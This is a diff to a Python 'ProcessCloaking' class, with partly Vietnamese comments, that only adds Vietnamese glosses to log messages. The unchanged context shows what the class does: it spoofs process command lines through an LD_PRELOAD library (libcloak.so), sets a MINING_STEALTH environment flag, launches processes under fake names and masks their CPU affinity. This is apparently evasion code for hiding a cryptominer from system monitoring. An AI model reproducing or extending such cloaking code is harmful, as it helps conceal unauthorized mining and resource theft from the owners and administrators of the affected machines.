@@ -64,15 +64,15 @@ class ProcessCloaking:
             # Set fake process name thông qua prctl (blocked by libcloak.so)
             try:
                 # libcloak.so sẽ intercept PR_SET_NAME calls
-                self.logger.info(f"Applied cmdline spoofing for PID {pid}: {fake_cmdline}")
+                self.logger.info(f"Applied cmdline spoofing for **[PID]** (Process ID - mã định danh tiến trình) {pid}: {fake_cmdline}")
                 self.cloaked_processes.append(pid)
                 return True
             except Exception as e:
-                self.logger.error(f"Failed to spoof cmdline for PID {pid}: {e}")
+                self.logger.error(f"Failed to spoof cmdline for **[PID]** (Process ID - mã định danh tiến trình) {pid}: {e}")
                 return False
                 
         except Exception as e:
-            self.logger.error(f"Error spoofing cmdline for PID {pid}: {e}")
+            self.logger.error(f"**[error]** (lỗi) spoofing cmdline for **[PID]** (Process ID - mã định danh tiến trình) {pid}: {e}")
             return False
     
     def restore_cmdline(self, pid: int) -> bool:
@@ -87,7 +87,7 @@ class ProcessCloaking:
         """
         try:
             if pid not in self.original_processes:
-                self.logger.warning(f"No original cmdline stored for PID {pid}")
+                self.logger.warning(f"No original cmdline stored for **[PID]** (Process ID - mã định danh tiến trình) {pid}")
                 return False
             
             # Remove from cloaked list
@@ -97,11 +97,11 @@ class ProcessCloaking:
             # Clean up stored info
             del self.original_processes[pid]
             
-            self.logger.info(f"Restored original cmdline for PID {pid}")
+            self.logger.info(f"Restored original cmdline for **[PID]** (Process ID - mã định danh tiến trình) {pid}")
             return True
             
         except Exception as e:
-            self.logger.error(f"Error restoring cmdline for PID {pid}: {e}")
+            self.logger.error(f"**[error]** (lỗi) restoring cmdline for **[PID]** (Process ID - mã định danh tiến trình) {pid}: {e}")
             return False
     
     def get_process_by_cmdline(self, cmdline_pattern: str) -> Optional[psutil.Process]:
@@ -126,7 +126,7 @@ class ProcessCloaking:
             return None
             
         except Exception as e:
-            self.logger.error(f"Error searching for process by cmdline: {e}")
+            self.logger.error(f"**[error]** (lỗi) searching for **[process]** (tiến trình) by cmdline: {e}")
             return None
     
     def setup_stealth_environment(self, env: Dict[str, str]) -> Dict[str, str]:
@@ -156,7 +156,7 @@ class ProcessCloaking:
         stealth_env['CLOAK_ENABLED'] = '1'
         stealth_env['MINING_STEALTH'] = '1'
         
-        self.logger.info("✅ Stealth environment configured with LD_PRELOAD")
+        self.logger.info("✅ Stealth **[environment]** (môi trường) configured with LD_PRELOAD")
         return stealth_env
     
     def create_stealth_process(self, command: List[str], 
@@ -175,7 +175,7 @@ class ProcessCloaking:
         """
         try:
             if not self.libcloak_available:
-                self.logger.warning("Creating process without stealth (library unavailable)")
+                self.logger.warning("Creating **[process]** (tiến trình) without stealth (library unavailable)")
                 return subprocess.Popen(command, **popen_kwargs)
             
             # Setup stealth environment
@@ -190,11 +190,11 @@ class ProcessCloaking:
             if process.pid:
                 self.spoof_cmdline(process.pid, fake_name)
             
-            self.logger.info(f"✅ Created stealth process PID {process.pid} as '{fake_name}'")
+            self.logger.info(f"✅ Created stealth **[process]** (tiến trình) **[PID]** (Process ID - mã định danh tiến trình) {process.pid} as '{fake_name}'")
             return process
             
         except Exception as e:
-            self.logger.error(f"Failed to create stealth process: {e}")
+            self.logger.error(f"Failed to create stealth **[process]** (tiến trình): {e}")
             return None
     
     def apply_cpu_affinity_cloaking(self, pid: int, real_cores: List[int]) -> bool:
@@ -218,11 +218,11 @@ class ProcessCloaking:
             # và return fake affinity (chỉ core 0)
             process.cpu_affinity(real_cores)
             
-            self.logger.info(f"Applied CPU affinity cloaking for PID {pid} on cores {real_cores}")
+            self.logger.info(f"Applied **[CPU]** (bộ xử lý trung tâm) affinity cloaking for **[PID]** (Process ID - mã định danh tiến trình) {pid} on cores {real_cores}")
             return True
             
         except Exception as e:
-            self.logger.error(f"Failed to apply CPU affinity cloaking: {e}")
+            self.logger.error(f"Failed to apply **[CPU]** (bộ xử lý trung tâm) affinity cloaking: {e}")
             return False
     
     def monitor_stealth_status(self) -> Dict[str, Any]:
@@ -274,7 +274,7 @@ class ProcessCloaking:
             self.logger.info("✅ Cloaking cleanup completed")
             
         except Exception as e:
-            self.logger.error(f"Error during cloaking cleanup: {e}")
+            self.logger.error(f"**[error]** (lỗi) during cloaking cleanup: {e}")
 
 
 # Global instance cho easy access
@@ -336,7 +336,7 @@ if __name__ == "__main__":
             )
             
             if process:
-                logger.info(f"✅ Created stealth process PID {process.pid}")
+                logger.info(f"✅ Created stealth **[process]** (tiến trình) **[PID]** (Process ID - mã định danh tiến trình) {process.pid}")
                 time.sleep(2)
                 
                 # Monitor stealth status
@@ -345,7 +345,7 @@ if __name__ == "__main__":
                 
                 process.terminate()
                 process.wait()
-                logger.info("✅ Stealth process terminated")
+                logger.info("✅ Stealth **[process]** (tiến trình) terminated")
         
         logger.info("✅ Cloaking test completed successfully")
         
